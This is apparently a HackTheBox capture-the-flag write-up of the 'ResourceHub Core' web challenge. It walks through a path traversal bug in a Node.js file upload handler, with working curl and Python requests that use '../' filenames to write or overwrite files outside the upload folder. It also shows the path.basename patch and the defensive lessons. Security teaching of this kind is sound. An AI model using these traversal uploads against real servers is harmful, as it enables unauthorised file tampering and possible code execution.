<div align="center">

# ResourceHub Core -- HackTheBox

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Web-blue?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Solved-success?style=for-the-badge)

<img src="../../assets/MrsNobody.png" width="200" alt="MrsNobody">

**MrsNobody**

---

</div>

> **Disclaimer:** This writeup is for educational purposes only, performed in an authorized Hack The Box environment.

## Challenge Information

| Field      | Value            |
|------------|------------------|
| Name       | ResourceHub Core |
| Category   | Web              |
| Difficulty | Easy             |
| Points     | 20               |
| Creator    | lordrukie        |

## Table of Contents

1. [Scenario](#scenario)
2. [Initial Reconnaissance](#initial-reconnaissance)
3. [Source Code Analysis](#source-code-analysis)
4. [Identifying the Vulnerability](#identifying-the-vulnerability)
5. [Exploitation -- Path Traversal](#exploitation----path-traversal)
6. [Understanding the Solver](#understanding-the-solver)
7. [Patching the Vulnerability](#patching-the-vulnerability)
8. [Verification and Flag](#verification-and-flag)
9. [Flag](#flag)
10. [Key Takeaways](#key-takeaways)

## Scenario

> *"The NecroNet unleashes its undead AI worm on the Global Resource Hub, cutting off water, food and power -- and the Citadel Consortium calls in its elite white-hat operatives to reclaim the portal."*

Once again we face the **HTB Editor** -- a browser-based code editor exposing the source of a Node.js resource management application. Our task is to find the vulnerability, prove exploitation is possible, patch the code, and pass the automated verifier.

**Target:** `<CHALLENGE_IP>:<PORT>`

---

## Initial Reconnaissance

### Retrieving the Directory Structure

```bash
curl -s http://<CHALLENGE_IP>:<PORT>/api/directory | python3 -m json.tool
```

Project layout:

```
.
├── app.js
├── routes/
│   └── routes.js
├── static/
│   ├── js/
│   ├── css/
│   └── index.html
├── resources/
│   └── (uploaded files land here)
├── exploit/
│   └── solver.py
└── package.json
```

### Reading Key Source Files

```bash
# Read the application routes (contains the vulnerability)
curl -s "http://<CHALLENGE_IP>:<PORT>/api/file?path=routes/routes.js"

# Read the provided exploit
curl -s "http://<CHALLENGE_IP>:<PORT>/api/file?path=exploit/solver.py"

# Read the main application file
curl -s "http://<CHALLENGE_IP>:<PORT>/api/file?path=app.js"
```

---

## Source Code Analysis

### Application Overview

ResourceHub Core is a resource management portal built with **Express.js**. It provides:

- A file upload feature for sharing resources among enclaves
- Static file serving from the `static/` directory
- A resources directory where uploaded files are stored

The application uses the `formidable` library to handle multipart file uploads. Uploaded files are moved from a temporary directory to the `resources/` folder.

### The Vulnerable Endpoint -- `routes/routes.js`

The critical code is in the file upload handler:

```javascript
// routes/routes.js -- VULNERABLE VERSION

const formidable = require('formidable');
const path = require('path');
const fs = require('fs');

router.post('/upload', (req, res) => {
    const form = new formidable.IncomingForm();

    form.parse(req, (err, fields, files) => {
        if (err) {
            return res.status(400).json({ error: 'Upload failed' });
        }

        const file = files.resource;
        const targetFilename = file.originalFilename;  // UNSANITIZED!
        const targetPath = path.join(__dirname, '../resources', targetFilename);

        fs.renameSync(file.filepath, targetPath);

        res.json({ message: 'File uploaded', filename: targetFilename });
    });
});
```

### Static File Serving -- `app.js`

The application serves static files from the `static/` directory:

```javascript
// app.js
app.use('/challenge', express.static(path.join(__dirname, 'static')));
```

This means anything placed inside `static/js/` is accessible at `/challenge/js/`.

---

## Identifying the Vulnerability

**Vulnerability Type:** Path Traversal (Directory Traversal) in File Upload

The upload handler has a critical flaw in how it constructs the destination file path:

```javascript
const targetFilename = file.originalFilename;  // User-controlled!
const targetPath = path.join(__dirname, '../resources', targetFilename);
```

The `originalFilename` property comes directly from the multipart form data -- it is fully controlled by the attacker. The application uses this value **without any sanitization** in `path.join()`.

### How `path.join()` Handles Traversal

Consider what happens when the filename contains `../`:

```javascript
path.join(__dirname, '../resources', '../static/js/evil.txt')
// Resolves to: /app/static/js/evil.txt
```

The `../` sequence in the filename causes `path.join()` to resolve upward from the `resources/` directory, allowing the attacker to write files to **any location** within the application directory tree.

### The Attack Surface

By writing files into the `static/` directory, an attacker can:

- Overwrite existing JavaScript files served to users (XSS/defacement)
- Place new files accessible via the web server
- Potentially overwrite application source files (depending on permissions)

In the context of this challenge, the exploit demonstrates writing a file to `static/js/` and then accessing it via the web.

---

## Exploitation -- Path Traversal

### Step 1: Craft the Malicious Upload

The key is to set the filename in the multipart form data to include directory traversal sequences. Using `curl`, we can control the filename with the `-F` flag:

```bash
# Upload a file with a traversal filename
# The filename "../static/js/testfile.txt" will escape the resources/ directory
curl -s -X POST "http://<CHALLENGE_IP>:<PORT>/challenge/api/upload" \
  -F "resource=@/tmp/testfile.txt;filename=../static/js/testfile.txt"
```

First, create the test file:

```bash
echo "Path traversal proof of concept" > /tmp/testfile.txt
```

Then upload it:

```bash
curl -s -X POST "http://<CHALLENGE_IP>:<PORT>/challenge/api/upload" \
  -F "resource=@/tmp/testfile.txt;filename=../static/js/testfile.txt"
```

Expected response:

```json
{"message": "File uploaded", "filename": "../static/js/testfile.txt"}
```

### Step 2: Verify the File Was Written Outside `resources/`

Access the file via the static file server:

```bash
curl -s "http://<CHALLENGE_IP>:<PORT>/challenge/js/testfile.txt"
```

Expected output:

```
Path traversal proof of concept
```

The file was written to `static/js/testfile.txt` instead of `resources/testfile.txt`, confirming the path traversal vulnerability.

### Step 3: Demonstrate Wider Impact

An attacker could overwrite legitimate application files:

```bash
# This could overwrite the main application JavaScript (DO NOT run in production)
curl -s -X POST "http://<CHALLENGE_IP>:<PORT>/challenge/api/upload" \
  -F "resource=@malicious.js;filename=../static/js/app.js"
```

Or write to other sensitive locations:

```bash
# Write into the application root
curl -s -X POST "http://<CHALLENGE_IP>:<PORT>/challenge/api/upload" \
  -F "resource=@payload.js;filename=../app.js"
```

---

## Understanding the Solver

The provided `exploit/solver.py` demonstrates the path traversal attack:

```python
# exploit/solver.py (key logic)

import requests

BASE = f"http://{HOST}:{PORT}/challenge/api"
s = requests.Session()

# 1. Create a test file in memory
test_content = b"path_traversal_proof"

# 2. Upload with a traversal filename
#    The filename escapes resources/ and writes into static/js/
files = {
    'resource': ('../static/js/testfile.txt', test_content, 'text/plain')
}
resp = s.post(f"{BASE}/upload", files=files)
print(f"[*] Upload response: {resp.json()}")

# 3. Verify the file is accessible via the static server
resp = s.get(f"http://{HOST}:{PORT}/challenge/js/testfile.txt")
if resp.text == "path_traversal_proof":
    print("[+] Path traversal confirmed -- file written outside resources/")
```

The solver uses Python's `requests` library, which allows setting an arbitrary filename in the multipart `files` parameter. The tuple format `(filename, content, content_type)` controls the `originalFilename` that the server receives.

### How the Filename Reaches the Server

When `requests` sends the multipart form data, it includes:

```
Content-Disposition: form-data; name="resource"; filename="../static/js/testfile.txt"
```

The `formidable` library on the server parses this header and sets `file.originalFilename` to `../static/js/testfile.txt`. Since the server never sanitizes this value, the traversal works.

---

## Patching the Vulnerability

The fix is to use `path.basename()` to strip any directory components from the uploaded filename, ensuring the file is always written into the intended `resources/` directory.

### Vulnerable Code

```javascript
// BEFORE -- filename used directly, allows traversal
const targetFilename = file.originalFilename;
const targetPath = path.join(__dirname, '../resources', targetFilename);
fs.renameSync(file.filepath, targetPath);
```

### Patched Code

```javascript
// AFTER -- path.basename() strips directory components
const targetFilename = path.basename(file.originalFilename);
const targetPath = path.join(__dirname, '../resources', targetFilename);
fs.renameSync(file.filepath, targetPath);
```

### What `path.basename()` Does

```javascript
path.basename('../static/js/testfile.txt')
// Returns: 'testfile.txt'

path.basename('../../../../etc/passwd')
// Returns: 'passwd'

path.basename('normal-file.pdf')
// Returns: 'normal-file.pdf'
```

`path.basename()` extracts only the final component of a path, discarding all directory information. This is the standard defense against path traversal in filenames.

After the fix, any traversal attempt:

```javascript
path.join(__dirname, '../resources', path.basename('../static/js/evil.txt'))
// Resolves to: /app/resources/evil.txt  (safely contained)
```

### Applying the Patch via the Editor API

```bash
# Save the patched file
curl -s -X POST "http://<CHALLENGE_IP>:<PORT>/api/save" \
  -H "Content-Type: application/json" \
  -d '{"path":"routes/routes.js","content":"<PATCHED_CONTENT>"}'
```

Replace `<PATCHED_CONTENT>` with the full contents of `routes/routes.js` including the `path.basename()` fix shown above.

---

## Verification and Flag

### Restart the Application

```bash
curl -s -X POST "http://<CHALLENGE_IP>:<PORT>/api/restart"
```

### Run the Verifier

The verifier runs the solver against the patched application. With the fix in place, the traversal filename is stripped to just the base name, the file is written into `resources/` as intended, and the solver cannot reach the `static/` directory. The verifier confirms success:

```bash
curl -s "http://<CHALLENGE_IP>:<PORT>/api/verify"
```

Expected response:

```json
{"message": "Congratulations!", "flag": "HTB{b3w4re_0f_un54n1tiz3d_████████████████████████}"}
```

---

## Flag

| Field | Value                                                      |
|-------|------------------------------------------------------------|
| Flag  | `HTB{b3w4re_0f_un54n1tiz3d_████████████████████████}` |

---

## Key Takeaways

1. **Never trust user-supplied filenames.** The `originalFilename` in file uploads is fully attacker-controlled. Always sanitize it before using it in file system operations. `path.basename()` is the minimum required defense.

2. **`path.join()` does not prevent traversal.** A common misconception is that `path.join()` somehow sanitizes input. It does not -- it faithfully resolves `../` sequences. The call `path.join('/safe/dir', '../../../etc/passwd')` produces `/etc/passwd`.

3. **Path traversal can lead to arbitrary file write.** In this challenge, the impact was limited to the application directory. In real-world scenarios, path traversal in file uploads can lead to remote code execution (overwriting server scripts), configuration tampering, or data destruction.

4. **Validate after normalization.** After sanitizing the filename with `path.basename()`, consider additional validation: check against an allowlist of extensions, enforce a maximum filename length, and reject or replace special characters.

5. **Use a generated filename when possible.** The safest approach is to ignore the uploaded filename entirely and generate a random one (e.g., a UUID). Store the original filename in a database for display purposes only, never use it on the filesystem.

6. **Consider multiple traversal encodings.** Attackers may use URL encoding (`%2e%2e%2f`), double encoding, null bytes, or Unicode normalization tricks to bypass naive filters. `path.basename()` handles these correctly because it operates on the resolved path, but string-based filters (e.g., rejecting strings containing `../`) can often be bypassed.

---

<div align="center">

**Written by MrsNobody**

<img src="../../assets/MrsNobody.png" width="80">

*Hack The Box -- ResourceHub Core*

</div>

<!--
  SEO Keywords:
  HackTheBox, HTB, ResourceHub Core, ResourceHub, writeup, walkthrough,
  challenge, web, path traversal, directory traversal, file upload,
  arbitrary file write, originalFilename, path.join, path.basename,
  formidable, multipart, Express.js, Node.js, file system, static files,
  CTF, capture the flag, cybersecurity, penetration testing, white-hat,
  lordrukie, easy, web exploitation, OWASP, unrestricted file upload,
  CWE-22, filename sanitization, directory escape, dot-dot-slash
-->
